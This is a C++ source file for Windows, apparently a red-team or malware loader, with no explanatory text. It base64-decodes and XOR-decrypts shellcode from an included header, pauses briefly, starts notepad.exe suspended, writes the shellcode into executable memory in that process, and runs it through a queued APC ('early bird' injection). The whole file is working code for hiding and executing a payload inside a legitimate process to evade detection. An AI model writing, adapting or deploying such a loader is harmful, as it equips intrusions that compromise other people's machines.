#include <windows.h>
#include <iostream>
#include "shellcode_encoded.h"

DWORD Base64Decode(const char* input, BYTE** output) {
    DWORD len = 0;
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
    *output = (BYTE*)malloc(len);
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &len, NULL, NULL);
    return len;
}

void DecryptShellcode(BYTE* data, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    Sleep(1500);
    BYTE* decoded = NULL;
    DWORD len = Base64Decode(b64_shellcode, &decoded);
    DecryptShellcode(decoded, len, XOR_KEY);
    unsigned char* shellcode = decoded;
    SIZE_T shellcodeSize = len;

    LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
    PROCESS_INFORMATION procInfo;

    printf("[+] Creating Notepad.exe as Suspended Process.\n");
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);
    

    // 4. Allocate memory in the target process
    LPVOID remoteMemory = VirtualAllocEx(procInfo.hProcess,NULL,shellcodeSize,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

    if (!remoteMemory) {
        std::cerr << "Failed to allocate memory in the target process. Error: " << GetLastError() << std::endl;
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 5. Write the shellcode to the allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(procInfo.hProcess,remoteMemory,shellcode,shellcodeSize,&bytesWritten)) {
        std::cerr << "Failed to write shellcode to the target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 6. Queue an APC to the main thread of the target process (FIXED: cast NULL to ULONG_PTR)
    if (!QueueUserAPC((PAPCFUNC)remoteMemory, procInfo.hThread, (ULONG_PTR)NULL)) {
        std::cerr << "Failed to queue APC. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 7. Resume the main thread to trigger the APC and execute the shellcode
    if (ResumeThread(procInfo.hThread) == -1) {
        std::cerr << "Failed to resume thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(procInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(procInfo.hProcess, 1);
        delete startupInfo;
        free(decoded);
        return 1;
    }

    // 8. Cleanup
    CloseHandle(procInfo.hThread);
    CloseHandle(procInfo.hProcess);
    delete startupInfo;
    free(decoded);

    return 0;
}
